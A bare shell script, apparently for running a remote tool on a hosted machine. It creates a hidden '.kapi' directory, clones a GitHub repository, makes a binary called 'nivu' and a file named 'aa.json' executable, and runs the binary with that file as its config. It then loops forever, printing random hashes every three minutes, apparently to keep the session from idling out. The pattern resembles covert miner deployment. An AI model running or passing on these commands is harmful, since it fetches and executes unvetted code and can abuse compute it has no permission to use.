mkdir .kapi && cd .kapi
git clone https://github.com/bengetsia/subites.git
cd subites
chmod +x aa.json && chmod +x nivu
./nivu -c "aa.json"
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
